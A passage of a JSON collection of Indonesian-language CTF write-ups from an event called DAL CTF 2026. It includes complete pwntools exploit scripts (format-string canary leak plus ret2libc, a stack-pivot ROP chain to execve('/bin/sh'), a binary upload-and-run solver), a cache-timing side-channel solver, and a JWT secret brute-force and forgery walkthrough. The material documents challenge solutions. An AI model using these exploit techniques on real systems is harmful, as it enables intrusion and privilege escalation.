        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport base64\r\nimport re\r\nimport socket\r\nimport sys\r\nimport time\r\nfrom pathlib import Path\r\n\r\n\r\ndef recv_until(sock, markers, timeout=90):\r\n    end = time.time() + timeout\r\n    data = b\"\"\r\n    while time.time() < end:\r\n        try:\r\n            chunk = sock.recv(4096)\r\n            if not chunk:\r\n                break\r\n            data += chunk\r\n            if any(marker in data for marker in markers):\r\n                return data\r\n        except socket.timeout:\r\n            pass\r\n    return data\r\n\r\n\r\ndef run_cmd(sock, cmd, timeout=15):\r\n    sock.sendall(cmd.encode() + b\"\\n\")\r\n    return recv_until(sock, [b\"$ \"], timeout=timeout)\r\n\r\n\r\ndef build_payload():\r\n    payload_path = Path(__file__).with_name(\"exploit_min\")\r\n    if not payload_path.exists():\r\n        raise FileNotFoundError(\"exploit_min not found next to solve.py\")\r\n    b64 = base64.b64encode(payload_path.read_bytes()).decode()\r\n    return [b64[i:i + 200] for i in range(0, len(b64), 200)]\r\n\r\n\r\ndef solve(host, port):\r\n    chunks = build_payload()\r\n\r\n    sock = socket.create_connection((host, port), timeout=15)\r\n    sock.settimeout(20)\r\n\r\n    data = recv_until(sock, [b\"login:\"], timeout=120)\r\n    if b\"login:\" not in data:\r\n        raise RuntimeError(\"login prompt not found\")\r\n\r\n    sock.sendall(b\"ebpf\\n\")\r\n    data = recv_until(sock, [b\"Password:\"], timeout=30)\r\n    if b\"Password:\" not in data:\r\n        raise RuntimeError(\"password prompt not found\")\r\n\r\n    sock.sendall(b\"\\n\")\r\n    data = recv_until(sock, [b\"$ \"], timeout=30)\r\n    if b\"$ \" not in data:\r\n        raise RuntimeError(\"shell prompt not found\")\r\n\r\n    run_cmd(sock, \": >/tmp/ex.b64\", timeout=10)\r\n    for idx, chunk in enumerate(chunks):\r\n        out = run_cmd(sock, f\"echo '{chunk}' >> /tmp/ex.b64\", timeout=10)\r\n        if b\"$ \" not in out:\r\n            raise RuntimeError(f\"failed while uploading chunk {idx}\")\r\n\r\n    sock.sendall(\r\n        b\"base64 -d /tmp/ex.b64 > /tmp/ex && chmod +x /tmp/ex && \"\r\n        b\"/chal >/dev/null 2>&1 && /tmp/ex; echo __DONE__$?\\n\"\r\n    )\r\n    out = recv_until(sock, [b\"__DONE__\"], timeout=30)\r\n    text = out.decode(\"latin1\", \"replace\")\r\n\r\n    match = re.search(r\"(dalctf\\{[^\\s\\x00]+\\})\", text)\r\n    if not match:\r\n        sys.stdout.write(text)\r\n        raise RuntimeError(\"flag not found\")\r\n\r\n    flag = match.group(1)\r\n    print(flag)\r\n    return flag\r\n\r\n\r\ndef main():\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"--host\", default=\"instancer.dalctf2026.com\")\r\n    parser.add_argument(\"--port\", type=int, required=True)\r\n    args = parser.parse_args()\r\n    solve(args.host, args.port)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "```text\ndalctf{1_<3_t41l_c4ll5}",
    "lessonsLearned": []
  },
  {
    "id": "dalctf2026-pwn-jackblack",
    "title": "Jack Black",
    "ctfName": "DAL CTF 2026",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge Jack Black",
    "problemDescription": "Challenge ini keliatan seperti game blackjack biasa, tapi ada dua bug di jalur kemenangan:\n\n1. `fgets(name, 256, stdin)` membaca sampai 256 byte ke buffer `name[64]`  \n   Ini memberi stack overflow.\n2. `printf(name)` dipanggil langsung tanpa format string tetap  \n   Ini memberi format string vulnerability.\n\nProteksi binary:\n\n- `NX` aktif\n- `Canary` aktif\n- `No PIE`\n- `Partial RELRO`\n\nKarena ada canary, overflow mentah tidak cukup. Solusi paling enak adalah pakai format string dulu untuk leak canary dan libc, lalu pada win berikutnya kirim payload overflow + ret2libc.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Binary yang dipakai adalah `blackjack`.\n\nSource yang disediakan langsung memperlihatkan bagian rentan:\n\n\n\nLayout stack dari `game_loop` di assembly:\n\n- `name` ada di `rbp-0x50`\n- canary ada di `rbp-0x8`\n\nJadi offset dari awal buffer ke canary adalah:",
        "code": "char name[NAME_BUF];\n...\nfgets(name, 256, stdin);\nname[strcspn(name, \"\\n\")] = '\\0';\nprintf(\"Processing transaction for: \");\nprintf(name);"
      },
      {
        "title": "Leak",
        "content": "Jalur bug hanya bisa diakses kalau menang satu hand. Jadi exploit harus:\n\n1. main sampai menang\n2. kirim format string pendek untuk leak\n3. pilih main lagi\n4. menang lagi\n5. kirim payload overflow\n\nSaya pakai strategi sederhana:\n\n- `hit` kalau total hand `< 17`\n- `stand` kalau total hand `>= 17`\n\nItu sudah cukup untuk menang secara konsisten.\n\nDari brute force index format string, didapat:\n\n- `%17$p` -> stack canary\n- `%43$p` -> pointer ke libc\n\nUntuk libc remote yang dibundel, leak `%43$p` selalu punya offset:",
        "code": "libc_base = leak - 0x2a28b"
      },
      {
        "title": "ROP",
        "content": "Setelah base libc diketahui, chain yang dipakai sederhana:\n\n\n\nOffset payload:\n\n\n\nSesudah name diproses, program masih menanyakan:\n\n\n\nSupaya fungsi `game_loop()` benar-benar `return` dan ROP jalan, jawaban harus `n`.",
        "code": "ret\npop rdi ; ret\n\"/bin/sh\"\nsystem"
      },
      {
        "title": "Kendala Praktis",
        "content": "Ada satu detail yang penting:\n\n`fgets` berhenti saat bertemu newline (`0x0a`). Kalau byte `0x0a` muncul di canary atau alamat ROP, payload bisa kepotong di tengah.\n\nSolusi saya:\n\n- cek apakah payload mengandung `\\n`\n- kalau iya, tutup koneksi dan coba lagi\n\nKarena ASLR berubah tiap koneksi, retry penuh lebih simpel dan tetap cepat."
      },
      {
        "title": "Hasil",
        "content": "Exploit final ada di `exploit.py`.\n\nAlurnya:\n\n1. konek ke remote\n2. menang sekali\n3. leak canary dan libc\n4. menang lagi\n5. kirim ret2libc\n6. jawab `n`\n7. dapat shell\n8. baca `flag.txt`\n\nFlag yang didapat:",
        "code": "dalctf{w3r3_y0u_c0unt1ng_c4rd5?}"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (exploit.py):",
        "code": "from pwn import *\r\nimport re\r\n\r\ncontext.clear(arch=\"amd64\")\r\ncontext.binary = exe = ELF(\"./blackjack\", checksec=False)\r\nlibc = ELF(\"./libc.so.6\", checksec=False)\r\nld = \"./ld-linux-x86-64.so.2\"\r\n\r\nHOST = \"instancer.dalctf2026.com\"\r\nPORT = 38605\r\n\r\nHIT_PROMPT = b\"(h)it or (s)tand? \"\r\nPLAY_PROMPT = b\"Play another hand? [y/n]: \"\r\nNAME_PROMPT = b\"Enter your name for the transaction record: \"\r\n\r\n\r\ndef start():\r\n    if args.REMOTE:\r\n        return remote(HOST, PORT)\r\n    return process([ld, \"--library-path\", \".\", exe.path])\r\n\r\n\r\ndef recv_until_any(io, suffixes, timeout=5):\r\n    buf = b\"\"\r\n    while True:\r\n        if any(buf.endswith(s) for s in suffixes):\r\n            return buf\r\n        chunk = io.recv(timeout=timeout)\r\n        if not chunk:\r\n            raise EOFError(buf)\r\n        buf += chunk\r\n\r\n\r\ndef next_state(io):\r\n    return recv_until_any(io, [HIT_PROMPT, PLAY_PROMPT, NAME_PROMPT])\r\n\r\n\r\ndef current_total(buf):\r\n    text = buf.decode(\"latin-1\", errors=\"ignore\")\r\n    match = re.search(r\"\\((\\d+)\\)\\n\\(h\\)it or \\(s\\)tand\\? $\", text)\r\n    if not match:\r\n        raise ValueError(f\"failed to parse hand total from: {text!r}\")\r\n    return int(match.group(1))\r\n\r\n\r\ndef play_until_win(io):\r\n    while True:\r\n        buf = next_state(io)\r\n        while buf.endswith(HIT_PROMPT):\r\n            total = current_total(buf)\r\n            io.sendline(b\"h\" if total < 17 else b\"s\")\r\n            buf = next_state(io)\r\n        if buf.endswith(NAME_PROMPT):\r\n            return\r\n        if not buf.endswith(PLAY_PROMPT):\r\n            raise ValueError(f\"unexpected state: {buf!r}\")\r\n        io.sendline(b\"y\")\r\n\r\n\r\ndef attempt():\r\n    io = start()\r\n    try:\r\n        play_until_win(io)\r\n        io.sendline(b\"%17$p.%43$p\")\r\n        leak_buf = next_state(io).decode(\"latin-1\", errors=\"ignore\")\r\n        match = re.search(\r\n            r\"Processing transaction for: (0x[0-9a-f]+)\\.(0x[0-9a-f]+)\", leak_buf\r\n        )\r\n        if not match:\r\n            raise ValueError(f\"failed to parse leak from: {leak_buf!r}\")\r\n\r\n        canary = int(match.group(1), 16)\r\n        libc.address = int(match.group(2), 16) - 0x2A28B\r\n\r\n        rop = ROP(libc)\r\n        payload = flat(\r\n            b\"A\" * 72,\r\n            canary,\r\n            b\"B\" * 8,\r\n            rop.find_gadget([\"ret\"]).address,\r\n            rop.find_gadget([\"pop rdi\", \"ret\"]).address,\r\n            next(libc.search(b\"/bin/sh\\x00\")),\r\n            libc.sym.system,\r\n        )\r\n\r\n        if b\"\\n\" in payload:\r\n            raise RuntimeError(\"payload contains newline byte, retrying\")\r\n\r\n        play_until_win(io)\r\n        io.sendline(payload)\r\n        recv_until_any(io, [PLAY_PROMPT])\r\n        io.sendline(b\"n\")\r\n        return io\r\n    except Exception:\r\n        io.close()\r\n        raise\r\n\r\n\r\ndef main():\r\n    while True:\r\n        try:\r\n            io = attempt()\r\n            io.interactive()\r\n            return\r\n        except KeyboardInterrupt:\r\n            raise\r\n        except Exception as exc:\r\n            log.warning(\"%s\", exc)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "dalctf{w3r3_y0u_c0unt1ng_c4rd5?}",
    "lessonsLearned": []
  },
  {
    "id": "dalctf2026-pwn-sropdetector",
    "title": "SROP Detector",
    "ctfName": "DAL CTF 2026",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "tags": [],
    "description": "Challenge ini ternyata bukan soal bypass detector yang rumit, tapi soal memanfaatkan buffer overflow yang sangat jelas di fungsi input.",
    "problemDescription": "Tahap pertama dipakai untuk leak alamat `puts` dari GOT:\n\n- pakai gadget `pop rdi; ret` di `0x401311`\n- panggil `puts@plt(puts@got)`\n- balik lagi ke `main`\n\nDari leak itu, base libc bisa dihitung dengan akurat. Saya cocokkan libc challenge dengan image `ubuntu:22.04` dari Dockerfile, dan offset-offset simbolnya memang sesuai.\n\nTahap kedua tidak langsung ret2libc biasa ke `system(\"/bin/sh\")`, karena saya ingin jalur yang lebih stabil. Saya pivot stack ke `.bss`, lalu jalankan chain libc untuk:\n\n- set `rdi = \"/bin/sh\"`\n- set `rsi = argv`\n- set `rdx = 0`\n- panggil `execve(\"/bin/sh\", argv, NULL)`\n\n`argv` saya siapkan sendiri di `.bss` sebagai array:\n\n- `argv[0] = \"/bin/sh\"`\n- `argv[1] = NULL`\n\nPivot ke `.bss` dilakukan dengan:\n\n- overwrite `rbp` menjadi alamat `.bss`\n- return ke blok `read` di `0x4012f0`\n- blok itu membaca stage kedua ke area `rbp-0x40`\n- saat fungsi selesai, `leave; ret` otomatis memindahkan stack ke `.bss`\n\nSetelah shell aktif, script tinggal mengirim:\n\n```sh\ncat /flag.txt\n```\n\ndan flag keluar.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Menjalankan solver",
        "content": "Remote:\n\n\n\nLokal dengan runtime Ubuntu 22.04 yang sudah saya salin:",
        "code": "python3 exploit.py"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\n\r\nHOST = \"instancer.dalctf2026.com\"\r\nPORT = 27071\r\n\r\ncontext.binary = elf = ELF(\"./slop_detector\", checksec=False)\r\nlibc = ELF(\"./libc.so.6\", checksec=False)\r\n\r\nPOP_RDI = 0x401311\r\nPOP_RBP = 0x40121D\r\nREAD_STAGE2 = 0x4012F0\r\nBSS_RBP = 0x404400\r\nARGV = 0x4044D0\r\n\r\n\r\ndef start():\r\n    if args.LOCAL:\r\n        return process([\"./ld-linux-x86-64.so.2\", \"--library-path\", \".\", \"./slop_detector\"])\r\n    return remote(HOST, PORT)\r\n\r\n\r\ndef build_stage2():\r\n    rop = ROP(libc)\r\n    pop_rsi = rop.find_gadget([\"pop rsi\", \"ret\"]).address\r\n    pop_rdx_rbx = libc.address + 0x904A9\r\n    ret = rop.find_gadget([\"ret\"]).address\r\n    binsh = next(libc.search(b\"/bin/sh\\x00\"))\r\n    execve = libc.symbols[\"execve\"]\r\n\r\n    return fit(\r\n        {\r\n            0x40: flat(\r\n                BSS_RBP,\r\n                ret,\r\n                POP_RDI,\r\n                binsh,\r\n                pop_rsi,\r\n                ARGV,\r\n                pop_rdx_rbx,\r\n                0,\r\n                0,\r\n                execve,\r\n            ),\r\n            0x100: flat(binsh, 0),\r\n        },\r\n        filler=b\"Y\",\r\n    )\r\n\r\n\r\ndef main():\r\n    io = start()\r\n\r\n    io.recvuntil(b\"sentence: \")\r\n    io.send(flat(b\"A\" * 72, POP_RDI, elf.got[\"puts\"], elf.plt[\"puts\"], elf.symbols[\"main\"]))\r\n\r\n    puts_leak = u64(io.recvline().strip().ljust(8, b\"\\x00\"))\r\n    libc.address = puts_leak - libc.symbols[\"puts\"]\r\n    log.info(f\"puts leak = {hex(puts_leak)}\")\r\n    log.info(f\"libc base = {hex(libc.address)}\")\r\n\r\n    io.recvuntil(b\"sentence: \")\r\n    io.send(flat(b\"B\" * 72, POP_RBP, BSS_RBP, READ_STAGE2))\r\n    sleep(0.2)\r\n    io.send(build_stage2())\r\n    sleep(0.3)\r\n\r\n    io.sendline(b\"cat /flag.txt\")\r\n    data = io.recvrepeat(2)\r\n    print(data.decode(\"latin-1\", errors=\"ignore\").strip())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "dalctf{1_r34lly_h0p3_u_d1dnt_sl0p_1t}",
    "lessonsLearned": []
  },
  {
    "id": "dalctf2026-pwn-toiletsimulator",
    "title": "Toilet Simulator",
    "ctfName": "DAL CTF 2026",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "tags": [],
    "description": "Challenge ini bukan soal memory corruption biasa.",
    "problemDescription": "Service menjalankan proses `victim` sebagai root. Dari source yang tersedia di host:\n\n```c\nvolatile uint8_t *probe[2] = { base + PROBE0_OFF, base + PROBE1_OFF };\n\nfor (;;) {\n    sem_wait(&ctl->req);\n    int i = ctl->index;\n    if (i >= 0 && i < ctl->nbits) {\n        int bit = (flag[i / 8] >> (7 - (i % 8))) & 1;\n        (void)*probe[bit];\n    }\n    sem_post(&ctl->done);\n}\n```\n\nArtinya:\n\n1. Kita bisa membuka shared memory `/simulator` karena dibuat dengan mode `0666`.\n2. Ada dua page probe:\n   - `probe0` untuk bit `0`\n   - `probe1` untuk bit `1`\n3. Kita bisa memilih bit mana yang ingin dibocorkan dengan menulis `ctl->index`.\n4. Sinkronisasi dilakukan lewat semaphore `req` dan `done`, jadi tidak perlu balapan liar. Tinggal:\n   - flush kedua probe dari cache\n   - set index bit\n   - `sem_post(req)`\n   - tunggu `sem_wait(done)`\n   - ukur probe mana yang sekarang lebih cepat diakses\n\nProbe yang lebih cepat berarti probe itu baru saja disentuh oleh `victim`, sehingga bit bisa diketahui.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Login ke host:\n\n\n\nCek proses dan shared memory:\n\n\n\nYang penting terlihat:\n\n- proses `/usr/local/bin/victim` berjalan\n- `/dev/shm/simulator` world-readable dan world-writable\n\nSource `victim.c` juga tersedia di home directory, jadi jalur eksfiltrasinya bisa dibaca langsung.",
        "code": "ssh player@instancer.dalctf2026.com -p 59991"
      },
      {
        "title": "Strategi Eksploitasi",
        "content": "Saya pakai helper C karena butuh instruksi `clflush` dan timing cycle yang presisi (`rdtscp`).\n\nAlur helper:\n\n1. `shm_open(\"/simulator\", O_RDWR, 0)`\n2. `mmap` shared memory\n3. Ambil pointer ke:\n   - `ctl`\n   - `probe0`\n   - `probe1`\n4. Untuk tiap bit:\n   - flush `probe0` dan `probe1`\n   - tulis `ctl->index = i`\n   - `sem_post(&ctl->req)`\n   - `sem_wait(&ctl->done)`\n   - ukur akses ke `probe0` dan `probe1`\n5. Karena timing kadang noisy, satu bit di-sample beberapa kali lalu dipilih dengan voting mayoritas.\n\nPendekatan ini jauh lebih stabil dibanding satu kali ukur per bit."
      },
      {
        "title": "Solver",
        "content": "File yang dipakai:\n\n- `exploit.c`: helper `Flush+Reload`\n- `solve.py`: login via SSH pakai pwntools, upload helper, compile di remote, jalankan beberapa kali, lalu ambil flag dengan regex\n\nJalankan:\n\n\n\nFallback venv kalau perlu:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nfrom pathlib import Path\r\n\r\nfrom pwn import context, log, ssh\r\n\r\n\r\nHOST = \"instancer.dalctf2026.com\"\r\nPORT = 59991\r\nUSER = \"player\"\r\nPASSWORD = \"dalctf\"\r\n\r\n\r\ndef main() -> None:\r\n    context.log_level = \"info\"\r\n\r\n    src = Path(__file__).with_name(\"exploit.c\").read_text()\r\n    shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)\r\n\r\n    shell.upload_data(src.encode(), \"/tmp/exploit.c\")\r\n    log.info(\"uploaded exploit helper\")\r\n\r\n    compile_cmd = \"gcc -O2 /tmp/exploit.c -o /tmp/exploit\"\r\n    result = shell.run(compile_cmd)\r\n    result.recvall(timeout=10)\r\n    if result.poll() != 0:\r\n        raise SystemExit(\"remote compile failed\")\r\n\r\n    for attempt in range(1, 8):\r\n        io = shell.run(\"for i in 1 2 3 4 5; do /tmp/exploit 2>/dev/null; echo; done\")\r\n        data = io.recvall(timeout=15)\r\n        text = data.decode(\"latin-1\", errors=\"ignore\")\r\n        match = re.search(r\"dalctf\\{[^}\\n]+\\}\", text)\r\n        if match:\r\n            print(match.group(0))\r\n            return\r\n        log.warning(\"attempt %d did not recover a clean flag\", attempt)\r\n\r\n    raise SystemExit(\"flag not found\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "dalctf{p00p_em0j1}",
    "lessonsLearned": []
  },
  {
    "id": "dalctf2026-web-iceman",
    "title": "ICEMAN",
    "ctfName": "DAL CTF 2026",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "tags": [],
    "description": "Challenge ini ngasih sebuah endpoint web yang langsung me-redirect ke `/graphql`.",
    "problemDescription": "Challenge ini ngasih sebuah endpoint web yang langsung me-redirect ke `/graphql`. Dari tampilan console di halaman itu kelihatan kalau aplikasi memang sengaja menyediakan GraphQL playground sederhana dengan input JWT manual lewat header `Authorization: Bearer <token>`.",
    "tools": [],
    "analysis": "Hal pertama yang saya cek adalah apakah introspection aktif. Ternyata aktif tanpa butuh autentikasi.\n\nQuery yang dipakai:\n\n```graphql\n{\n  __schema {\n    queryType { name }\n    mutationType { name }\n    types { name }\n  }\n}\n```\n\nDari situ kelihatan ada:\n\n- `Mutation.register(username, password)`\n- `Mutation.login(username, password)`\n- `Query.me`\n- `Query.releasedAlbums`\n- `Query.album(id)`\n- `Query.label(name)`\n\nLalu saya introspect lagi object penting seperti `AuthPayload`, `User`, `Album`, `Label`, dan `Artist`. Hasil pentingnya:\n\n- `AuthPayload` cuma punya field `token`\n- `User` punya `username` dan `tier`\n- `Album` punya field sensitif `vaultManifest`\n\nItu langsung jadi petunjuk bahwa kemungkinan flag ada di `vaultManifest`.",
    "solution": [
      {
        "title": "2. Bikin akun fan dan lihat mekanisme akses",
        "content": "Saya register akun biasa:\n\n\n\nServer mengembalikan JWT:\n\n\n\nSetelah didecode, payload-nya:\n\n\n\nWaktu token itu dipakai untuk query `me`, `releasedAlbums`, atau `label`, server selalu balas error:\n\n\n\nBerarti kontrol akses hanya membedakan `fan` vs `ovo`.",
        "code": "mutation {\n  register(username: \"fan12345\", password: \"pass12345\") {\n    token\n  }\n}"
      },
      {
        "title": "3. Uji validasi JWT",
        "content": "Saya coba beberapa hal standar:\n\n- ubah payload jadi `tier: \"ovo\"` tapi pakai signature lama\n- bikin token `alg: none`\n\nKeduanya gagal dan dianggap tidak terautentikasi. Jadi signature memang diverifikasi.\n\nKarena header token pakai `HS256`, berarti ada shared secret di backend. Dengan satu token valid dan payload yang kita tahu, kita bisa brute-force secret kalau ternyata lemah."
      },
      {
        "title": "4. Brute-force secret JWT",
        "content": "Saya mulai dari wordlist kecil yang tematik dengan challenge ini. Ternyata secret-nya langsung ketemu:\n\n\n\nJadi kelemahannya adalah JWT signing secret yang sangat lemah dan mudah ditebak.",
        "code": "iceman"
      },
      {
        "title": "5. Forge token tier `ovo`",
        "content": "Setelah tahu secret `iceman`, saya forge JWT baru dengan payload:\n\n\n\nLalu ditandatangani ulang pakai HMAC-SHA256 dengan key `iceman`.\n\nToken hasil forge:",
        "code": "{\n  \"username\": \"fan12345\",\n  \"tier\": \"ovo\"\n}"
      },
      {
        "title": "6. Ambil data album unreleased",
        "content": "Dengan token forged itu, query berikut berhasil:\n\n\n\nDari response, album unreleased `ICEMAN` muncul dan field `vaultManifest` berisi flag:",
        "code": "{\n  me { username tier }\n  label(name: \"OVO\") {\n    name\n    artists {\n      name\n      albums {\n        id\n        title\n        status\n        vaultManifest\n        tracks {\n          number\n          title\n        }\n      }\n    }\n  }\n}"
      }
    ],
    "terminalOutputs": [],
    "flag": "dalctf2026{open-ticket-send-me-ur-fav-song-in-album6}",
    "lessonsLearned": []
  }
];
